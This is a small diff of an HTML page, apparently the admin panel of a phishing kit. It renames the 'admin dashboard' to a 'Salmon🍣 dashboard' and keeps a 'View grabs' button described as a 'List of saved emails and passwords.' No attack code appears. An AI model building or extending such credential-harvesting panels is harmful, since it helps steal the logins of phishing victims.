@@ -11,7 +11,7 @@
     <body>
        <div class="centered-login">
         <img src="./../images/config.png" width="50" width="50">
-        <p style="text-align:center;">This is the admin dashboard.</p><br><br>
+        <p style="text-align:center;">This is the Salmon🍣 dashboard.</p><br><br>
             <a href="./grabs.php"><button style="float:none; width:250px;">View grabs</button></a>
             <p style="text-align:center; font-size:11px;">List of saved emails and passwords.</p>
             <br><br>
